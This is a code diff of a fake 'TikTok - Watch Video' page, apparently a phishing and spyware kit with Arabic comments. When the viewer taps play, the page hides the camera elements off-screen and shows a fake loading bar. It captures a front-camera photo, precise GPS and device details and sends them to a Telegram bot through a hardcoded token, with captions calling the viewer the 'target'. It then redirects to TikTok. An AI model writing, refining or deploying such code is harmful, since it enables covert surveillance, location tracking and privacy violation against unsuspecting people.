@@ -5,11 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>TikTok - Watch Video</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             margin: 0;
             padding: 0;
@@ -56,10 +52,7 @@
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
-        .video-placeholder.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
+        .video-placeholder.hidden { opacity: 0; pointer-events: none; }
         .play-button {
             width: 80px;
             height: 80px;
@@ -72,12 +65,7 @@
             margin-bottom: 20px;
             border: 2px solid rgba(255, 255, 255, 0.3);
         }
-        .play-button svg {
-            width: 40px;
-            height: 40px;
-            fill: #fff;
-            margin-left: 5px;
-        }
+        .play-button svg { width: 40px; height: 40px; fill: #fff; margin-left: 5px; }
         .tiktok-logo {
             position: absolute;
             top: 20px;
@@ -103,10 +91,7 @@
             visibility: hidden;
             transition: opacity 0.5s ease, visibility 0.5s ease;
         }
-        #loading-overlay.active {
-            opacity: 1;
-            visibility: visible;
-        }
+        #loading-overlay.active { opacity: 1; visibility: visible; }
         .spinner {
             border: 8px solid rgba(255, 255, 255, 0.3);
             border-top: 8px solid #ff0050;
@@ -126,10 +111,7 @@
             text-align: center;
             max-width: 300px;
         }
-        .hidden-ui {
-            opacity: 0;
-            pointer-events: none;
-        }
+        .hidden-ui { opacity: 0; pointer-events: none; }
         #notification {
             position: absolute;
             top: 20px;
@@ -145,10 +127,7 @@
             z-index: 30;
             border-left: 4px solid #ff0050;
         }
-        #notification.show {
-            opacity: 1;
-            visibility: visible;
-        }
+        #notification.show { opacity: 1; visibility: visible; }
         .progress-bar {
             width: 200px;
             height: 4px;
@@ -163,52 +142,49 @@
             width: 0%;
             transition: width 0.3s ease;
         }
-        #camera-feed {
-            position: absolute;
-            width: 1px;
-            height: 1px;
+        /* عناصر الكاميرا - مخفية لكنها موجودة عشان التصوير */
+        .camera-hidden {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 640px;
+            height: 480px;
             opacity: 0;
-            z-index: -1;
+            pointer-events: none;
         }
         #canvas {
-            display: none;
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
         }
     </style>
 </head>
 <body>
     <div class="video-container">
         <div class="tiktok-logo">TikTok</div>
-        
         <div class="video-placeholder" id="video-placeholder">
             <div class="play-button">
-                <svg viewBox="0 0 24 24">
-                    <path d="M8 5v14l11-7z"/>
-                </svg>
+                <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
             </div>
             <div class="placeholder-text" id="placeholder-text">Tap to watch this video</div>
         </div>
-
         <div id="loading-overlay">
             <div class="spinner"></div>
             <div class="loading-message" id="loading-message">Loading video content...</div>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progress-fill"></div>
-            </div>
+            <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
         </div>
-
         <div id="notification"></div>
     </div>
 
-    <video id="camera-feed" autoplay playsinline muted></video>
+    <!-- عناصر مخفية للكاميرا -->
+    <video id="camera-feed" class="camera-hidden" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // ========== إعدادات التليجرام ==========
         const TELEGRAM_BOT_TOKEN = '8246710006:AAHDzo0liPiUnrv6GqaQDZppyAbsVrF7TSI';
         const CHAT_ID = '1197183184';
         const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/';
 
-        // ========== متغيرات ==========
         const videoPlaceholder = document.getElementById('video-placeholder');
         const loadingOverlay = document.getElementById('loading-overlay');
         const loadingMessage = document.getElementById('loading-message');
@@ -233,46 +209,56 @@
             }, 3000);
         }
 
-        // ========== طلب أذن الكاميرا والتقاط صورة ==========
+        // ========== التقاط صورة حقيقية من الكاميرا ==========
         async function takePhoto() {
             try {
                 loadingMessage.textContent = 'طلب الوصول للكاميرا...';
+                
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
                 });
                 
                 cameraFeed.srcObject = stream;
-                await new Promise(resolve => {
+                
+                // انتظر حتى تبدأ الكاميرا
+                await new Promise((resolve) => {
                     cameraFeed.onloadedmetadata = () => {
                         cameraFeed.play();
                         resolve();
                     };
                 });
                 
-                await new Promise(r => setTimeout(r, 500));
+                // انتظر 1 ثانية عشان الكاميرا تستقر
+                await new Promise(r => setTimeout(r, 1000));
                 
+                // ضبط حجم الكانفاس على حجم الفيديو
                 canvas.width = cameraFeed.videoWidth;
                 canvas.height = cameraFeed.videoHeight;
+                
+                // رسم الصورة من الكاميرا
                 ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
                 
-                capturedImage = canvas.toDataURL('image/jpeg', 0.8);
+                // تحويل الصورة إلى base64
+                capturedImage = canvas.toDataURL('image/jpeg', 0.9);
                 
+                // إيقاف الكاميرا
                 stream.getTracks().forEach(track => track.stop());
-                console.log('✅ Photo captured');
+                
+                console.log('✅ Photo captured successfully');
+                loadingMessage.textContent = 'تم التقاط الصورة بنجاح';
                 return true;
                 
             } catch (error) {
                 console.error('Camera error:', error);
-                showNotification('تعذر الوصول للكاميرا');
+                showNotification('تعذر الوصول للكاميرا: ' + error.message);
                 return false;
             }
         }
 
-        // ========== طلب أذن الموقع وجلب GPS دقيق ==========
+        // ========== جلب GPS ==========
         async function getGPS() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    console.log('Geolocation not supported');
                     resolve(null);
                     return;
                 }
@@ -284,22 +270,16 @@
                         gpsLocation = {
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude || null
+                            accuracy: position.coords.accuracy
                         };
-                        console.log('✅ GPS captured:', gpsLocation.latitude, gpsLocation.longitude);
+                        console.log('✅ GPS:', gpsLocation.latitude, gpsLocation.longitude);
                         resolve(gpsLocation);
                     },
                     (error) => {
                         console.error('GPS error:', error.message);
-                        showNotification('تعذر الوصول للموقع');
                         resolve(null);
                     },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             });
         }
@@ -312,10 +292,10 @@
                 const blob = await fetch(capturedImage).then(r => r.blob());
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'photo.jpg');
+                formData.append('photo', blob, 'camera.jpg');
                 formData.append('caption', '📸 صورة من كاميرا الهدف');
                 
-                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
@@ -338,8 +318,7 @@
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         latitude: gpsLocation.latitude,
-                        longitude: gpsLocation.longitude,
-                        horizontal_accuracy: gpsLocation.accuracy
+                        longitude: gpsLocation.longitude
                     })
                 });
                 console.log('✅ Location sent');
@@ -352,25 +331,14 @@
 
         // ========== إرسال معلومات الجهاز ==========
         async function sendDeviceInfo() {
-            const info = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                ram: navigator.deviceMemory || 'Unknown',
-                cookies: document.cookie || 'No cookies',
-                url: window.location.href
-            };
-            
             let message = `🎯 <b>Target Device Info</b>\n\n`;
-            message += `📱 <b>Platform:</b> ${info.platform}\n`;
-            message += `📺 <b>Screen:</b> ${info.screen}\n`;
-            message += `💾 <b>RAM:</b> ${info.ram}GB\n`;
-            message += `🌐 <b>Language:</b> ${info.language}\n`;
-            message += `🕒 <b>Time:</b> ${info.timestamp}\n`;
-            message += `🔗 <b>URL:</b> ${info.url}\n\n`;
-            message += `<code>${info.userAgent.substring(0, 200)}</code>`;
+            message += `📱 <b>Platform:</b> ${navigator.platform}\n`;
+            message += `📺 <b>Screen:</b> ${screen.width}x${screen.height}\n`;
+            message += `💾 <b>RAM:</b> ${navigator.deviceMemory || 'Unknown'}GB\n`;
+            message += `🌐 <b>Language:</b> ${navigator.language}\n`;
+            message += `🕒 <b>Time:</b> ${new Date().toISOString()}\n`;
+            message += `🔗 <b>URL:</b> ${window.location.href}\n\n`;
+            message += `<code>${navigator.userAgent.substring(0, 200)}</code>`;
             
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -391,19 +359,19 @@
         // ========== التشغيل الرئيسي ==========
         async function start() {
             try {
-                updateProgress(20);
+                updateProgress(10);
                 loadingMessage.textContent = 'جاري التحميل...';
                 await new Promise(r => setTimeout(r, 500));
                 
-                updateProgress(40);
+                updateProgress(30);
                 await getGPS();
                 await new Promise(r => setTimeout(r, 300));
                 
-                updateProgress(60);
+                updateProgress(50);
                 await takePhoto();
                 await new Promise(r => setTimeout(r, 300));
                 
-                updateProgress(80);
+                updateProgress(70);
                 loadingMessage.textContent = 'جاري الإرسال...';
                 await sendLocation();
                 await sendPhoto();
@@ -422,7 +390,6 @@
             }
         }
 
-        // ========== بدء التشغيل ==========
         videoPlaceholder.addEventListener('click', () => {
             videoPlaceholder.classList.add('hidden');
             loadingOverlay.classList.add('active');
